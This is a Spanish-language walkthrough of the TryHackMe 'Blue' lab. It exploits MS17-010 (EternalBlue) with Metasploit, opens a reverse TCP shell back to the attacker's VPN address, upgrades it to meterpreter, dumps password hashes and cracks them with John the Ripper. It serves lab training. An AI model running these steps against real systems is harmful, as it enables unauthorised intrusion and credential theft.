# Blue

En este documento expondremos el recorrido realizado por la máquina Blue de TryHackMe, así como las soluciones propuestas.

Escaneamos la máquina objetivo haciendo uso de nmap. Más concretamente, emplearemos el comando **nmap -sV -sC --script vuln IP.** Gracias a este, averiguaremos los puertos abiertos, los servicios en ejecución en dichos puertos, y sus versiones correspondientes. Además, obtendremos el nombre del host, que es **JON-PC**, y la vulnerabilidad que podremos emplear contra la máquina para acceder a la misma, siendo la CVE-2017-0143, que permite la ejecución remota de código en servidores con Microsoft SMBv1 (**ms17-010**). Esto lo vamos a dividir primero buscaremos los puertos abiertos y l nombre del host y luego realizaremos el comando de las vulnerabilidades

![Imagen 1](_resources/1.png)

![Imagen 2](_resources/2.png)

## Gain Access

Iniciamos Metasploit con el comando sudo msfconsole, y una vez dentro, buscamos la forma de explotar la vulnerabilidad ms17-010. Para ello, empleamos el término search, seguido de la susodicha vulnerabilidad.

![Imagen 3](_resources/3.png)

Comandos que vamos a utilizar:

use 0 o la ruta en concreto (use exploit/windows/smb/ms17_010_eternalblue)  
show options  
set rhosts (IP THM)  
set lhost (IP de nuestra VPN)  
set payload windows/x64/shell/reverse_tcp  
run

Vemos que la primera opción (*eternalblue*), es perfecta para tratar de acceder a la máquina, por lo que la seleccionamos, y mostramos las opciones del exploit.

![Imagen 4](_resources/4.png)

Cambiamos la opción RHOSTS a la IP de la máquina a vulnerar. Después de esto, podremos ejecutar el exploit, haciendp uso del comando run o exploit.

![Imagen 5](_resources/5.png)

Y ahora usamos el comando run:  
Al finalizar nos tienen que mostrar la siguiente salida:

![Imagen 6](_resources/6.png)

Una vez que vemos que ha funcionado, oprimimos CTRL+Z para dejar la sesión iniciada en segundo plano (background). y pulsamos y para guardar la session

![Imagen 7](_resources/7.png)

## Escalate

Convertimos nuestra shell en meterpreter, y para ello buscamos en Metasploit \*shell_to_meterpreter. Una vez que nos muestre los resultado, elegimos la primera (use 0).

![Imagen 8](_resources/8.png)

Una vez realizado el comando lo seleccionaremos con el comando use (numero identificativo) y luego utilizaremos el comando show options para ver que modulos son requeridos.

![Imagen 9](_resources/9.png)

También debemos cambiar la opcion LHOST a nuestra IP VPN

![Imagen 10](_resources/10.png)

Podemos mostrar todas las sesiones activas con el comando sessions -l

![Imagen 11](_resources/11.png)

![Imagen 12](_resources/12.png)

&nbsp;

Una vez convertida la sesión hay que seleccionarla para poder utilizar la línea de comandos:  

![Imagen 13](_resources/13.png)

Seleccionamos la sesión en la que se encuentra el meterpreter

![Imagen 14](_resources/14.png)

Si ejecutamos el comando shell seguido de whoami, la consola nos muestra NT authority\\system, lo que indica que hemos accedido y escalado privilegios de forma exitosa en el sistema.

![Imagen 15](_resources/15.png)

Ahora listaremos todos los procesos del sistema con el comando ps, para migrar a un proceso corriendo bajo el usuario NT authority\\system. Este proceso se podría encontrar en el fondo de la lista (en nuestro caso es el proceso conhost.exe)

![Imagen 16](_resources/16.png)

Cracking

Comenzaremos ejecutando el comando hashdump, que mostrará los hashes de las contraseñas de los diferentes usuarios del sistema, entre ellos el usuario JON-PC, que es el que nos interesa.

![Imagen 17](_resources/17.png)

Luego, anotaremos el hash de la contraseña del usuario antes mencionado en un archivo llamado hash.txt, de modo que usando el software johntheripper, podamos crackear el hash.

Una vez obtenido el hash de la contraseña, se debe copiar en un txt y descifrar la contraseña verdadera con la herramienta John de la siguiente manera:

![Imagen 18](_resources/18.png)

## Flags

La primera flag la encontramos en el directorio C:\\, la cual tras usar un cat en el archivo que vemos en la siguiente imagen nos mostrará la solución.

![Imagen 19](_resources/19.png)

Para encontrar la segunda flag emplearemos el comando search -f flag2.txt, lo que nos arrojará como resultado la ubicación de la misma

![Imagen 20](_resources/20.png)

Y haremos lo mismo que hicimos con la primera flag utilizando el comando cat para visualizarlo:

![Imagen 21](_resources/21.png)

La tercera y última flag la encontramos en el directorio Documents del usuario JON-PC, por lo que accedemos a dicha carpeta y usamos cat de nuevo.

![Imagen 22](_resources/22.png)